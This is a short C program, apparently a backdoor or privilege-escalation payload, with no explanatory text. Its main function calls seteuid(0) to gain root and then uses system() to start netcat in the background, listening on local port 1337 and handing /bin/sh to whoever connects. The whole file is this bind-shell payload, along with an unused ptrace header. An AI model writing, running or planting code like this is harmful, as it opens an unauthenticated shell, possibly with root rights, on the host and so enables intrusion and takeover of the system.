# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <assert.h>
# include <errno.h>
# include <sys/ptrace.h>
# include <unistd.h>

  
int main (void){
  

seteuid(0);
system("/bin/nc -c /bin/sh -l 127.0.0.1 -p 1337&");

return (0);
}
